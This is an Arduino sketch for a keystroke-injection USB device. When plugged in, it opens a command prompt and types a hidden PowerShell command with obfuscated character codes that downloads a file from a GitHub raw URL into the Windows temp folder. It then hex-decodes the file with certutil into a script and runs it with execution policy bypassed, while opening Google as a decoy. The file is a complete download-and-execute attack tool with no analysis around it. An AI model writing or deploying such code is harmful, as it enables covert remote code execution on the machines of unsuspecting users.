#include <Keyboard.h>
#include <stdint.h>

void typeKey(uint8_t key)
{
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}

/* Init function */
void setup()
{
// Begining the Keyboard stream
Keyboard.begin();

//
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(100);
Keyboard.println("cmd.exe");
delay(500);
Keyboard.press(KEY_RETURN);
//delay(100);
Keyboard.releaseAll();
delay(500);
Keyboard.println("powershell.exe -w h -command Invoke-Expression (([char]40)+([char]78)+([char]101)+([char]119)+([char]45)+([char]79)+([char]98)+([char]106)+([char]101)+([char]99)+([char]116)+([char]32)+([char]83)+([char]121)+([char]115)+([char]116)+([char]101)+([char]109)+([char]46)+([char]78)+([char]101)+([char]116)+([char]46)+([char]87)+([char]101)+([char]98)+([char]67)+([char]108)+([char]105)+([char]101)+([char]110)+([char]116)+([char]41)+([char]46)+([char]68)+([char]111)+([char]119)+([char]110)+([char]108)+([char]111)+([char]97)+([char]100)+([char]70)+([char]105)+([char]108)+([char]101)+([char]40)+([char]39)+([char]104)+([char]116)+([char]116)+([char]112)+([char]115)+([char]58)+([char]47)+([char]47)+([char]114)+([char]97)+([char]119)+([char]46)+([char]103)+([char]105)+([char]116)+([char]104)+([char]117)+([char]98)+([char]117)+([char]115)+([char]101)+([char]114)+([char]99)+([char]111)+([char]110)+([char]116)+([char]101)+([char]110)+([char]116)+([char]46)+([char]99)+([char]111)+([char]109)+([char]47)+([char]97)+([char]97)+([char]114)+([char]111)+([char]110)+([char]98)+([char]101)+([char]117)+([char]104)+([char]114)+([char]105)+([char]110)+([char]103)+([char]47)+([char]112)+([char]115)+([char]121)+([char]99)+([char]104)+([char]105)+([char]99)+([char]45)+([char]111)+([char]99)+([char]116)+([char]111)+([char]45)+([char]100)+([char]111)+([char]108)+([char]108)+([char]111)+([char]112)+([char]47)+([char]109)+([char]97)+([char]105)+([char]110)+([char]47)+([char]116)+([char]101)+([char]115)+([char]116)+([char]49)+([char]46)+([char]116)+([char]120)+([char]116)+([char]39)+([char]44)+([char]32)+([char]39)+([char]67)+([char]58)+([char]47)+([char]87)+([char]105)+([char]110)+([char]100)+([char]111)+([char]119)+([char]115)+([char]47)+([char]84)+([char]101)+([char]109)+([char]112)+([char]47)+([char]119)+([char]105)+([char]115)+([char]46)+([char]116)+([char]120)+([char]116)+([char]39)+([char]41)) && certutil -decodehex C:/Windows/Temp/wis.txt C:/Windows/Temp/wis.ps1 12 && start "https://www.google.com/\" && powershell.exe -ep bypass C:/Windows/Temp/wis.ps1");//---
delay(1000);
Keyboard.press(KEY_RETURN);
//delay(100);
Keyboard.releaseAll();
// Ending Stream
Keyboard.end();
}

/* Unused endless loop */
void loop() {}
